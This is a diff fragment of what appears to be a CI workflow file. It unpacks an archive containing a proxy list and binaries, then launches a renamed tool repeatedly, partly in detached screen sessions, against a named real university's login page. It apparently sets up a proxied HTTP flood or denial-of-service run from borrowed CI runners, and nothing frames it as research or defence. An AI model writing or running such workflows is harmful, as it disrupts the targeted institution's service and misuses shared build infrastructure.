@@ -34,12 +34,12 @@ jobs:
           unzip Fc-main.zip
           mv  Fc-main/proxy.txt 90.txt
           chmod +x *
-          mv tol o          
+          mv ki o          
           
-          screen -dms ve ./o https://elearning.paruluniversity.ac.in/auth/login? 240 1 1 90.txt
+          screen -dms ve ./o https://elearning.paruluniversity.ac.in/auth/login? 240 1 1 
           screen -dms ve ./o https://elearning.paruluniversity.ac.in/auth/login? 240 1 1 90.txt
           
-          ./o https://elearning.paruluniversity.ac.in/auth/login 240 1 1  90.txt
+          ./o https://elearning.paruluniversity.ac.in/auth/login 240 1 1  
 
           
 
